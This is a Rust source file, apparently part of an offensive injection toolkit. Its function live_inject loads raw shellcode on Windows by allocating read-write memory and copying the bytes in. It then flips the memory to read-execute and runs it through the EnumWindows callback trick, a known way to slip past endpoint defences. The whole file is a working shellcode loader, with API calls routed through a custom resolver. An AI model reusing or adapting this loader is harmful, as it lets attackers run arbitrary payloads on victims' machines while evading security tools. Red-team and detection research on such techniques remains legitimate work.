use crate::injection::InjectionResult;
use crate::log::LogSink;

#[cfg(windows)]
pub fn live_inject(shellcode: &[u8], log: &LogSink) -> Result<InjectionResult, String> {
    use crate::resolve;

    const MEM_COMMIT: u32 = 0x1000;
    const MEM_RESERVE: u32 = 0x2000;
    const PAGE_READWRITE: u32 = 0x04;
    const PAGE_EXECUTE_READ: u32 = 0x20;

    log.step("[1/4] Allocate local memory (RW)".to_string());
    let alloc = unsafe {
        resolve::VirtualAlloc(
            std::ptr::null(),
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        )
    };
    if alloc.is_null() {
        return Err("allocation failed".to_string());
    }
    let base = alloc as usize;

    log.step(format!(
        "[2/4] Copy {} bytes to 0x{base:016X}",
        shellcode.len()
    ));
    unsafe {
        std::ptr::copy_nonoverlapping(shellcode.as_ptr(), alloc as *mut u8, shellcode.len());
    }

    log.step("[3/4] Set memory protection (RX)".to_string());
    let mut old_protect: u32 = 0;
    let ok = unsafe {
        resolve::VirtualProtect(alloc, shellcode.len(), PAGE_EXECUTE_READ, &mut old_protect)
    };
    if ok == 0 {
        return Err("memory protection change failed".to_string());
    }

    log.step("[4/4] Trigger callback execution".to_string());
    unsafe {
        resolve::EnumWindows(alloc as *const std::ffi::c_void, 0);
    }

    log.info(format!(
        "  ✓ Callback execution complete at 0x{base:016X}"
    ));

    Ok(InjectionResult {
        remote_base: base as u64,
        size: shellcode.len(),
    })
}

#[cfg(not(windows))]
pub fn live_inject(_shellcode: &[u8], _log: &LogSink) -> Result<InjectionResult, String> {
    Err("callback execution is only available on Windows".to_string())
}
